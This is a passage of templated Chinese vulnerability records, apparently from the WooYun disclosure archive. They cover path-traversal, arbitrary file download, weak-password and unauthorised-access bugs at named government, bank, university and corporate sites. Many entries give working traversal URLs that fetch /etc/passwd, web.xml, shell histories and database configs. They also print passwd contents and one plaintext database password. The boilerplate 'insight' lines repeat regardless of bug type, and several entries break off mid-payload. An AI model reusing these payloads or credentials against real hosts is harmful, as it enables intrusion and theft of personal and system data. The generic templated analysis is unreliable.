**详情**: URP综合教务系统1.3_8通过目录遍历可以得到“教师教务信息菜单”页面./reportAction.do该页面未对用户身份是否为教师做严格的检查在同一浏览器中用学生账号登陆可在./reportAction.do页面中查看全校所有学生的成绩，个人信息，及大量学校课程管理信息，教师信息。属敏感信息！

**POC**: 输入学号即可查看任意一个学生的个人信息可以查看全校学生名单可以非授权查看学校管理信息，如教师排课表

**绕过**: 直接利用

**修复**: 建议在“教师教务信息菜单”页面./reportAction.do中对用户的身份做严格检查
---

---
### [wooyun-2015-090271] 某知识产权局任意文件读取
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试：http://www.fjipo.gov.cn/templates/download.jsp?path=/UserFiles/File/../../WEB-INF/web.xml<code>http://www.fjipo.gov.cn/templates/download.jsp?path=/UserFiles/File/../../../../conf/tomcat-users.xml</code

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参数过滤。
---

---
### [wooyun-2014-083407] 慕课科技某分站.svn信息泄漏
**厂商**: 慕课科技 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://daxue.imooc.com/.svn/entries10dir603http://svn.imooc.com/svn/edu/trunk/webroothttp://svn.imooc.com/svn/edu2014-07-08T07:15:37.056400Z603yangmya4e448a1-2505-4e08-8786-d8e16af91e2chead.jpgfile2014-05-08T10:05:29.000000Zceec3b41418b08a80ce5e4912eacfad02014-05-08T10:10:00.974995Z18yuanxchhas-props35325crossdomain.xmlfile2014-07-08T07:07:41.000000Z09f73155628b45e7773da82f646c5ec12014-07-08T07:08

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010694] 财政部某网站任意文件下载
**厂商**: 财政部 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cks.mof.gov.cn/crifs/content/docmanage/download.jsp?filePath=../../../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2015-0131910] 百道网某处备份文件任意下载（源码泄漏）
**厂商**: 百道网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 信息泄露(目录遍历/文件下载)

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0149227] 五矿证券某系统存在任意文件下载漏洞
**厂商**: 中国五矿集团公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.wkzq.com.cn/wkzq/web/index.aspx五矿证券官网软件下载处，发现一个下载链接https://i.wkzq.com.cn/down.down?f=20150922044304523.exe构造一下https://i.wkzq.com.cn/down.down?f=../WEB-INF/web.xml

**POC**: https://i.wkzq.com.cn/down.down?f=../WEB-INF/classes/action/default-struts.xmlhttps://i.wkzq.com.cn/down.down?f=..%2FWEB-INF%2Fclasses%2Faction%2Faccount-struts.xml

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0134933] 中金在线某站存在目录遍历漏洞（可获取服务器敏感信息）
**厂商**: 福建中金在线网络股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中金联盟存在目录遍历漏洞可获取服务器敏感信息。

**POC**: 遍历地址：http://union.cnfol.com/mt/affiliates/styles.php?showstyles=1&md=../../../../../../../../../../../../../sbin/../etc/././passwd%00f.htmlhttp://union.cnfol.com/mt/scripts/styles.php?showstyles=1&md=../../../../../../../../../../../../../sbin/../etc/././passwd%00f.html在burp里用路径字典跑一下，可获取到协议信息和环境遍历配置

**绕过**: 直接利用

**修复**: 限制好目录的权限。
---

---
### [wooyun-2015-0138119] 慧达驿站某项目管理系统安全漏洞打包（越权访问/文件遍历下载等）
**厂商**: cnwisdom.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载：项目遍历泄露合作方信息

**POC**: 任意文件下载：项目遍历泄露合作方信息

**绕过**: 直接利用

**修复**: 限制目录下载处文件路径加强权限判断
---

---
### [wooyun-2015-0163612] 和睦家某站点任意文件下载（发现已沦为跳板）
**厂商**: ufh.com.cn | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ftp learning.ufh.com.cn# 1. 敏感信息泄露# 2. 沦为跳板机

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1. ftp添加认证。2. 好好检查下服务器吧。
---

---
### [wooyun-2011-03854] 中国红基会5.12灾后重建管理信息系统
**厂商**: 中国红十字基金会 | **年份**: 2011 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 自己看把，大家都懂的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置目录权限，修改后台验证。
---

---
### [wooyun-2016-0166909] 香港教育剧场论坛设计缺陷任意文件下载（香港地區）
**厂商**: 香港教育剧场 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**物理路径：/home/tefohkd01/domains/**.**.**.**/public_html/download.php构造，http://**.**.**.**/download.php?file=../../public_html/download.php配置文件下载，http://**.**.**.**/download.php?file=../../public_html/conn.phpconn.php中$sql_url = "localhost";$sql_user = "tefohkd01_tefo";$sql_pw = "YPx8OBjJ";$db = "tefohkd01_tefo";/etc/passwd下载,http://**.**.**.**/download.php?file=../../../../../../

**POC**: passwd中，root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2012-015984] 中国电信NMA网络办公系统任意文件下载+FCK
**厂商**: 中国电信 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 电信：http://www.dxnma.com/任意文件下载http://www.dxnma.com/downloadPatch.do?pathName=../WEB-INF/web.xmlfck 路径泄露：查看信息:http://www.dxnma.com/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../../../../../data/不深入了 就到这 求个邀请码 thx!

**POC**: 如上所示

**绕过**: 直接利用

**修复**: 升级fck 限制文件下载路径
---

---
### [wooyun-2015-0116255] 某高校系统两处任意文件读取
**厂商**: 江苏汇文软件有限公司 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前人案例：http://wooyun.org/bugs/wooyun-2010-085980任意文件读取：/opac/ajax_get_file.php?filename=../admin/opacadminpwd.php/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php案例：http://210.28.144.20:206/opac/http://opac.yzu.edu.cn:8080/opac/http://opac.lib.sdu.edu.cn/opac/http://lib2.nuist.edu.cn/opac/http://lib.shisu.edu.cn:8080/opac/http://202.205.213.113:8080/opac/http://211.87.113.2:8080/opac/

**POC**: 1#http://210.28.144.20:206/opac/ajax_get_file.php?filename=../admin/opacadminpwd.phphttp://210.28.144.20:206/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php2#http://opac.yzu.edu.cn:8080/opac/ajax_get_file.php?filename=../admin/opacadminpwd.phphttp://opac.yzu.edu.cn:8080/zplug/ajax_asyn_li

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2012-013568] 酷六任意文件读取
**厂商**: 酷6网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.http://so.ku6.com2.配置http://so.ku6.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml3.源码http://so.ku6.com/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 好像是配置访问权限吧,例如http://kongjie.joy.cn/这个就访问不了http://kongjie.joy.cn/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml
---

---
### [wooyun-2014-059996] 中国共产党文县委员会宣传部目录遍历及数据库备份泄漏
**厂商**: 中国共产党文县委员会宣传部 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 遍历：http://gswx.gov.cn/xinfang/备份：http://www.gswx.gov.cn/gswx.zip

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 厂家懂的
---

---
### [wooyun-2015-0127980] 某寿险业务系统存在通用型任意文件下载漏洞
**厂商**: 中科软科技 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 提供一些案例：http://218.241.156.50/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://broker.guohualife.com/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://180.169.84.48/ui/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://180.169.84.55/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://59.151.39.85/pre/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://epos.jxlife.com.cn/ter/f1p

**POC**: http://broker.guohualife.com/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwdhttp://180.169.84.48/ui/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwdhttp://180.169.84.55/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://59.151.39.85/pre/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://e

**绕过**: 直接利用

**修复**: 控制访问权限，或者删除该下载页面
---

---
### [wooyun-2014-085320] 某教务系统SQL注射+任意文件下载
**厂商**: lezhixing.com.cn | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京乐知行软件有限公司:http://www.lezhixing.com.cn/cms/lzx/case/index.jhtml看案例如下:http://202.108.154.209/datacenter/downloadApp/loadAppInfo.do?1414310370856&appId=f889bbb1102247d2ae00c85dbdd51ea8&versionType=http://www.dxyzzx.com/datacenter/downloadApp/loadAppInfo.do?1414310370856&appId=f889bbb1102247d2ae00c85dbdd51ea8&versionType=http://www.tzjyzb.com/datacenter/downloadApp/loadAppInfo.do?1414310370856&appId

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤参数
---

---
### [wooyun-2014-077996] 郴州市住房公积金任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.czzfgjj.com.cn可能 存在注入  但是  没测试成功

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ------
---

---
### [wooyun-2015-096676] 用友某系统任意文件下载
**厂商**: 用友软件 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友人力资源管理任意文件下载之前挖过的一个注入，5个为例子吧218.2.115.222:8088120.40.72.157:4001219.140.193.253zhaopin.cnooc.com.cn发送的数据包GET //hrss/dorado/smartweb2.loadConst.d?language=zh&country=\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.html HTTP/1.1Host: 218.2.115.222:8088User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0Accept: tex

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 通过递归过滤\和..等特殊字符，防止00截断
---

---
### [wooyun-2014-065752] 万户OA多处无限制任意文件下载
**厂商**: 万户OA | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 头两处没啥好说的直接利用<%// 得到文件名字和路径String filepath="";HttpServletRequest HSR=(HttpServletRequest)pageContext.getRequest();String path=request.getParameter("path");filepath=HSR.getRealPath("https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/")+"/"+path+"/";String filename = request.getParameter("FileName");String name = request.getParameter("name");// 设置响应头和下载保存的文件名response.setContentType("csv");response

**POC**: 后面两处要多一道程序，不过不麻烦。<%String local = session.getAttribute("org.apache.struts.action.LOCALE").toString();// 得到文件名字和路径String filepath="";HttpServletRequest HSR=(HttpServletRequest)pageContext.getRequest();String path=request.getParameter("path");filepath=HSR.getRealPath("https://wooyun-img.oss-cn-beijing

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-024762] 当当网影视频道本地文件读取漏洞
**厂商**: 当当网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://movie.dangdang.com/project/movie/hosts/ajax_proxy.php漏洞测试：POST /project/movie/hosts/ajax_proxy.php HTTP/1.1Referer: http://movie.dangdang.com:80/Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestAccept: text/html, */*Content-Length: 128User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)Pragma: no-cacheHost: movie.dangdang.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 未进行传输的参数：如果忽略预期传递到动态网页的某个参数，应用程序应向用户提供可接受的错误消息。另外，不要在应用程序中使用参数之前，就假设正在传输参数。格式错误的参数：不要假设参数的格式有效。如果该参数要传递到 SQL 数据库，尤其要注意这一点。没有首先检查格式是否正确就直接将字符串传递到数据库，可能
---

---
### [wooyun-2015-0143568] 上海股权托管交易中心综合金融服务平台任意文件下载（整站源码下载）
**厂商**: 上海股权托管交易中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:8080/questionInves/pilupdf.jsp?url=/home/tomcat/apache-tomcat-6.0.35/webapps/mgt/pilufile/pilu1398676666622.pdfurl参数没限制，可传任意路径，如/etc/hosts等，下载/home/tomcat/.vimrc和/home/tomcat/.bash_history找到很多路径如下整站源码http://**.**.**.**:8080/questionInves/pilupdf.jsp?url=/home/tomcat/apache-tomcat-6.0.35/webapps20150324.tar.gz

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 文件我都删了，拒绝查表。
---

---
### [wooyun-2015-0147745] 某省政府采购网任意文件下载漏洞
**厂商**: 某省政府采购网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在下载招标公告处存在下载链接，如下图看到文章标题就已经很惊讶了，政府都开始采购这个了，难道也是福利吗？按照下载链接修改路径http://**.**.**.**/zfcg/FileDown.jsp?fname=userfilesWai/../../../../../etc/passwd可以下载passwd文件无图无真相

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不要使用路径参数
---

---
### [wooyun-2015-0103365] 平安集团某分站任意文件读取
**厂商**: 中国平安保险（集团）股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pacz.pa18.com/pacz_core/do/oea/loadNasFile?fileType=png&folder=qrCode.productInfo.nas&fileName=../../../../../../../../../../../../../../etc/passwd

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/dev/nulldaemon:x:2:2:daemon:/sbin:/dev/nulladm:x:3:4:adm:/var/adm:/dev/nulllp:x:4:7:lp:/var/spool/lpd:/dev/nullsync:x:5:0:sync:/sbin:/dev/nullshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/dev/nullmail:x:8:12:mail:/var/spool/mail

**绕过**: 直接利用

**修复**: 后台效验
---

---
### [wooyun-2013-027470] 莫泰168连锁酒店网站敏感信息泄漏漏洞
**厂商**: 如家酒店集团 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 莫泰168连锁酒店网站敏感信息泄漏权限设置不严格可以读数据库配置文件是目录遍历发现的~ http://freepp.10102020.net/wpb/http://freepp.10102020.net/wpb/config.ini

**POC**: 莫泰168连锁酒店网站敏感信息泄漏权限设置不严格可以读数据库配置文件是目录遍历发现的~ http://freepp.10102020.net/wpb/http://freepp.10102020.net/wpb/config.ini就这么多吧～

**绕过**: 直接利用

**修复**: 好像问题多多，你们自己再看看吧～
---

---
### [wooyun-2015-093355] 爱拍原创某监控系统存在目录遍历漏洞
**厂商**: 爱拍 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 爱拍原创某服务器监控系统存在目录遍历漏洞漏洞地址 http://120.132.37.228:8000/目录遍历，部分员工信息泄漏,服务器ip等信息

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2016-0171251] 某教育厅SSL VPN任意文件下载
**厂商**: 某教育网 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过burpsuite拦截下载证书URL地址：https://**.**.**.**/welcome.php通过分析下载文件目录和下载文件编码方式，可知采用BASE64编码方式，并采用特定结尾方式。如下，可验证编码方式。可通过修改下载文件目录和下载文件，获取很多信息。

**POC**: 查看passwd目录：查看WEB配置信息：通过WEB配置文件，可进一步获取代码目录，仅为学习，不为破坏。

**绕过**: 编码绕过

**修复**: 新版已修复，联系厂商修复漏洞
---

---
### [wooyun-2016-0168797] 中国人民银行征信中心某平台任意文件下载
**厂商**: 中国人民银行征信中心 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 感觉是一个废弃的站，利用起来也繁琐

**POC**: 一、测试passwd文件，可以看出用户不少啊！http://210.73.81.145/downfile.php?dir=../../../../../../../../../../etc/passwd%00.jpg&file=003.docroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologins

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0149732] 国家地理基础信息中心生产管理系统_目录遍历+弱口令登录
**厂商**: 国家基础地理信息中心 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、目录随意看**.**.**.**/2、系统弱口令 admin/admin要是弃用的系统关掉吧。虽然也知道我大天朝的站点都那个样，好歹也是个国家级的系统啊。

**POC**: 如上

**绕过**: 直接利用

**修复**: 1、修改口令2、修改目录权限3、如若是个弃用的站点关了吧。
---

---
### [wooyun-2015-0127827] 某高校大规模数据泄露,权限控制不当导致任意操作
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 逛着好奇，来到了小妹妹的学校网站，看着还不赖，登着进去一看。(⊙o⊙)…这命名规则好明显的说....219.230.159.145/index3.aspx,这不赤裸裸的告诉我还有1,2,3,4.同时压力测试系统目录泄露...网址仅供测试使用,部分信息仅提供证明...网址还请打码！功能太多...

**POC**: 211.65.74.100:8082 压力测试系统目录遍历（截止发稿官方已屏蔽，附上截图一张）根据社工得来的账号进入后很快发现命名规则，均以web_+"模块缩写"，导致大量网页泄露登录口未设验证码，可burpsuite破解！再来几张代表性截图麻麻再也不用担心我考试不好了其中学生个人信息,学生成绩等一系列隐私泄露...喂，你家孩子考试挂了，快打2000到XX银行账户上...O(∩_∩)O~（易被黑产利用）学生登陆后219.230.159.145/index3.aspx教师工号查询219.230.159.145/web_szgl/szgl_jsxx_ll.aspx学号命名规则219.230.159

**绕过**: 直接利用

**修复**: IIS吧....加强权限控制，seesion权限以及网页身份验证
---

---
### [wooyun-2014-052970] 上海股权托管交易中心分站任意文件下载
**厂商**: 上海股权托管交易中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.china-seeq.com/questionInves/pilupdf.jsp?url=/home/tomcat/apache-tomcat-6.0.35/webapps/mgt/WEB-INF/web.xml

**POC**: curl 'http://www.china-seeq.com/questionInves/pilupdf.jsp?url=/etc/passwd'root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:sh

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-036668] 菜无忧网上订购系统后台弱口令及目录遍历
**厂商**: 菜无忧 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 菜无忧网上订购系统后台弱口令+目录遍历导致信息泄露

**POC**: 1,目录遍历2，后台 ： http://www.caiwuyou.cn/admin/

**绕过**: 直接利用

**修复**: 清除第三方账号
---

---
### [wooyun-2016-0188129] 暴风影音某站任意文件读取
**厂商**: 暴风影音 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://103.15.202.155/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Froot%2F.bash_history可以确定是暴风影音的livesrc.baofengcloud.com

**POC**: http://103.15.202.155/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6

**绕过**: 直接利用

**修复**: 权限设置
---

---
### [wooyun-2013-039588] 明鉴网页漏洞综合扫描平台系统任意文件下载
**厂商**: 杭州安恒信息技术有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 未进行验证地址，存在任意下载文件漏洞。

**POC**: 不敢继续了。

**绕过**: 直接利用

**修复**: 过滤路径问题。
---

---
### [wooyun-2012-08398] 民政部某站点任意文件下载
**厂商**: 民政部 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://shflxh.mca.gov.cn/admin/content/docmanage/download.jsp?filePath=/tongzhigonggao/CISSE/fujian.doc其中文件下载路径参数filepath没有对路径进行必要的限制！

**POC**: http://shflxh.mca.gov.cn/admin/content/docmanage/download.jsp?filePath=/../../admin/content/docmanage/download.jsphttp://shflxh.mca.gov.cn/admin/content/docmanage/download.jsp?filePath=/../../admin/index/login.jsp.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2013-034219] 腾讯电脑管家 TSKsp.sys拒绝服务漏洞
**厂商**: 腾讯 | **年份**: 2013 | **类型**: 拒绝服务

**元思考**: 触发信号: 参数注入

**洞察**: 拒绝服务防护不足，开发者信任前端输入

**测试流程**:
1. 识别拒绝服务相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: TSKsp.sys发生未处理的ExRaiseDatatypeMisalignment异常。第1帧可以看到原来是ProbeForWrite函数抛出了Data misaligned - code 80000002这个异常kd>  .frame 101 f3cac838 f4945b53 nt!ProbeForWrite+0x54kd> dds f3cac838 l 10f3cac838  f3cac974f3cac83c  f4945b53 afd!AfdFastIoDeviceControl+0x4b3f3cac840  d40d73e7 //addressf3cac844  00000004 //Lengthf3cac848  00000004 //Alignmentf3cac84c  8644d288f3cac850  86261250f3cac854  f4943030 afd!Afd

**POC**: 已经说了.

**绕过**: 直接利用

**修复**: 他们懂
---

---
### [wooyun-2013-031965]  宾得理光任意文件下载漏洞
**厂商**: 宾得理光 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
